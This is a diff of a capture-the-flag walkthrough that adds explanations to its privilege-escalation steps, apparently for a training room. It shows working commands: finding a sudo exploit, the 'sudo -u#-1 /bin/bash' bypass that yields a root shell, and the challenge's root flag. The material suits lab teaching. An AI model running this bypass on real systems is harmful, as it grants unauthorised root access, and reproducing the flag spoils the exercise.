@@ -447,8 +447,8 @@ Alien_autospy.jpg                                                               
 
 ![]()
 
-40. `sudo -l`
-41. `sudo -v`
+40. `sudo -l` to list the privileges and permissions that are granted to the current user that we're running as, which revealed that they can start an interactive instance of the Bash shell without needing the root's password
+41. `sudo -V` to displat the version information and configuration details of the **sudo** command onto our terminal
 ```bash
 james@agent-sudo:~$ sudo -l
 [sudo] password for james: 
@@ -466,7 +466,7 @@ Sudoers policy plugin version 1.8.21p2
 Sudoers file grammar version 46
 Sudoers I/O plugin version 1.8.21p2
 ```
-42. `searchsploit sudo 1.8.2`
+42. `searchsploit sudo 1.8.2` to search for exploits related to version 1.8.2 of the sudo program
 43. `curl "https://www.exploit-db.com/raw/{EXPLOIT FILE}"`
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -569,7 +569,7 @@ print("Lets hope it works")
 os.system("sudo -u#-1 "+ binary)
 ```
 44. `sudo -u#-1 /bin/bash`
-45. `whoami`
+45. `whoami` to verify if we're running as root, which we are
 ```bash
 james@agent-sudo:~$ sudo -u#-1 /bin/bash
 root@agent-sudo:~#
@@ -579,7 +579,7 @@ root@agent-sudo:~# whoami
 root
 ```
 46. `find / -type f -name "root*" 2>/dev/null`
-47. `cat {ROOT FILE PATH}`
+47. `cat {ROOT FILE PATH}` to display the contents of the root text file onto our terminal, which ended up containing the root flag for this challenge
 ```bash
 root@agent-sudo:~# find / -type f -name "root*" 2>/dev/null
 /lib/recovery-mode/options/root
@@ -608,10 +608,6 @@ b53a02f55b57d4439e3341834d70c062
 By,
 DesKel a.k.a Agent R
 ```
-
-# Vulnerability Identification
-
-# Vulnerability Exploitation
 
 
 **Room completed!**
